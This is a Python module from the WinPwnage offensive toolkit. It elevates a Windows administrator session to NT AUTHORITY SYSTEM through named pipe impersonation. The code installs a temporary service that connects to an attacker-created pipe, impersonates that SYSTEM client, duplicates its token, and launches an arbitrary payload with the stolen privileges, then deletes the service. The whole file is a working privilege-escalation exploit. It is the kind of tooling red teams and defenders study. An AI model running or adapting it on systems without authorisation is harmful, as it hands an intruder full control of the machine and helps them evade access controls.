from winpwnage.core.prints import *
from winpwnage.core.utils import *
from winpwnage.core.winstructures import *

#Creds to: https://gist.github.com/highsenburger69/09b816daa16f020d188c289fd401b0b2

elevateMethod3_info = {
	"Description": "Elevate from administrator to NT AUTHORITY SYSTEM using named pipe impersonation",
	"Method": "Named pipe impersonation",
	"Id": "3",
	"Type": "Elevation",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "elevateMethod3",
	"Function Payload": True,
}

def Service(*args):
	service_name = r"WinPwnage"
	service_bin = r"%COMSPEC% /c ping -n 5 127.0.0.1 >nul && echo 'WinPwnage' > \\.\pipe\WinPwnagePipe"

	serviceDBHandle = OpenSCManager(bytes(r"\\localhost", encoding="utf-8"),
					bytes(r"ServicesActive", encoding="utf-8"),
					0x0001 | 0x0002)
	if not serviceDBHandle:
		print_error("Error while connecting to the local service database using OpenSCManager: {}".format(GetLastError()))
		return False

	schService = CreateService(serviceDBHandle, bytes(service_name, encoding="utf-8"),
					None, (0x00020000 | 0x00040000 | 0x0010), 0x00000010,
					0x00000003, 0x00000000, bytes(service_bin, encoding="utf-8"),
					None, None, None, None, None)
	if not schService:
		print_error("Error while creating our service using CreateService: {}".format(GetLastError()))
		return False
	else:
		print_info("Successfully created service")
	
	serviceHandle = OpenService(serviceDBHandle, bytes(service_name, encoding="utf-8"), 0x0010)
	if not StartService(serviceHandle, 0, None):
		print_error("Unable to start service, attempting rollback")
		if not DeleteService(serviceHandle):
			print_error("Unable to delete service, manual cleaning is needed!")
		else:
			print_success("Successfully deleted service")
	else:
		print_success("Successfully started service")

	CloseServiceHandle(serviceDBHandle)
	CloseServiceHandle(schService)

def delete_service():
	serviceDBHandle = OpenSCManager(bytes(r"\\localhost", encoding="utf-8"),
					bytes(r"ServicesActive", encoding="utf-8"),
					0x0001)

	print_info("Performing cleanup")
	serviceHandle = OpenService(serviceDBHandle, bytes(r"WinPwnage", encoding="utf-8"), 0x00010000)

	if DeleteService(serviceHandle) == 0:
		print_error("Unable to delete service, manual cleaning is needed!")
	else:
		print_success("Successfully deleted service")

	CloseServiceHandle(serviceDBHandle)

def elevateMethod3(payload):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	if payloads().exe(payload):
		params = payloads().exe(payload)[1].replace(payloads().exe(payload)[1].split(' ', 1)[0], '').lstrip()
		payload = payloads().exe(payload)[1].split(' ', 1)[0]

		hPipe = CreateNamedPipe(bytes(r"\\.\pipe\WinPwnagePipe", encoding="utf-8"),
					0x00000003, 0x00000000 | 0x00000000, 255, 0, 0, 0, None)
		if not hPipe:
			print_error("Error while creating our named pipe using CreateNamedPipe: {}".format(GetLastError()))
			return False
		else:
			print_success("Successfully created Named Pipe")

		RunService = CFUNCTYPE(None, POINTER(INT))(Service)
		print_info("Running service function in another thread, waiting for cmd.exe to send data to pipe")
		cThread = CreateThread(None, 0, RunService, None, 0, None)
		if not cThread:
			print_error("Error while Creating thread in the virtual space of the current process to mimick a client/server interaction like a multi-thread named pipe server using CreateThread: {}".format(GetLastError()))
			return False

		CloseHandle(cThread)

		if not ConnectNamedPipe(hPipe, None):
			print_error("Error while waiting the client to trigger a connection in the Named Pipe using ConnectNamedPipe: {}".format(GetLastError()))
			return False
		else:
			print_success("Connected to Named Pipe")

		print_info("Receiving payload from pipe")
		ReadFile(hPipe, 0, 0, None, None)

		if not ImpersonateNamedPipeClient(hPipe):
			print_error("Error while impersonating the access token at the end of the pipe using ImpersonateNamedPipeClient: {}".format(GetLastError()))
			delete_service()
			return False
		else:
			print_success("Impersonated  the client's security context")

		hToken = HANDLE(c_void_p(-1).value)
		if not OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, False, byref(hToken)):
			print_error("Error while opening our thread's token using OpenThreadToken: {}".format(GetLastError()))
			delete_service()
			return False
		else:
			print_success("Opened our current process's thread token")

		print_info("Converting token into a primary token")
		hPrimaryToken = HANDLE(c_void_p(-1).value)
		if DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, None, SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TOKEN_TYPE.TokenPrimary, byref(hPrimaryToken)) == STATUS_UNSUCCESSFUL:			
			print_error("Error while trying to convert the token into a primary token using DuplicateTokenEx with SecurityDelegation: {}".format(GetLastError()))
			print_info("Switching to different security impersonation level to SecurityImpersonation")
			if DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, None, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary,byref(hPrimaryToken)) == STATUS_UNSUCCESSFUL:
				print_error("Error while trying to convert the token into a primary token using DuplicateTokenEx with SecurityImpersonation: {}".format(GetLastError()))
				delete_service()
				return False
			else:
				print_success("Successfully converted token into a primary token using DuplicateTokenEx with SecurityImpersonation")			
		else:
			print_success("Successfully converted token into a primary token using DuplicateTokenEx with SecurityDelegation")

		print_info("Attempting to create elevated process")
		lpStartupInfo = STARTUPINFO()
		lpStartupInfo.cb = sizeof(lpStartupInfo)
		lpProcessInformation = PROCESS_INFORMATION()
		lpStartupInfo.dwFlags = 0x00000001
		lpStartupInfo.wShowWindow = 5
		if CreateProcessAsUser(hPrimaryToken, None, payload, params, None, False, 0, None, None, byref(lpStartupInfo), byref(lpProcessInformation)) == 0:
			print_error("Error while triggering payload using CreateProcessAsUser {}".format(GetLastError()))
			print_info("Switching create process method to CreateProcessWithToken")
			if CreateProcessWithToken(hPrimaryToken, 0x00000002, payload, params, 0x00000010, None, None, byref(lpStartupInfo), byref(lpProcessInformation)) == 0:
				print_error("Error while triggering payload using CreateProcessWithToken: {}".format(GetLastError()))
			else:				
				print_success("Successfully elevated process PID: {} using CreateProcessWithToken".format(lpProcessInformation.dwProcessId))
		else:
			print_success("Successfully elevated process PID: {} using CreateProcessAsUser".format(lpProcessInformation.dwProcessId))

		delete_service()
	else:
		print_error("Cannot proceed, invalid payload")
		return False
